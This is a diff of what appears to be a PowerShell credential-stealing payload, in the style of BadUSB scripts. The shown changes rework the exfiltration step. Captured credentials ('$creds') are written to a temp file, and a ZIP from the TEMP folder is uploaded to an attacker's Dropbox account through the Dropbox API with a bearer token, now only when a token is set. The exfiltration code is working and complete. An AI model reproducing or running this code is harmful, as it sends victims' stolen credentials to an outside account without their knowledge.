@@ -33,8 +33,8 @@
 #>
 
 #------------------------------------------------------------------------------------------------------------------------------------
-
-$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"
+# This is for if you want to host your own version of the script
+# $db = "YOUR-DROPBOX-ACCESS-TOKEN"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -139,15 +139,19 @@ echo $creds >> $env:TMP\$FileName
 	This is to upload your files to dropbox
 #>
 
-$TargetFilePath="/$FileName"
-$SourceFilePath="$env:TMP\$FileName"
+function dropbox {
+$TargetFilePath="/$ZIP"
+$SourceFilePath="$env:TEMP\$ZIP"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $DropBoxAccessToken
+$authorization = "Bearer " + $db
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
 $headers.Add("Dropbox-API-Arg", $arg)
 $headers.Add("Content-Type", 'application/octet-stream')
 Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+}
+
+if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
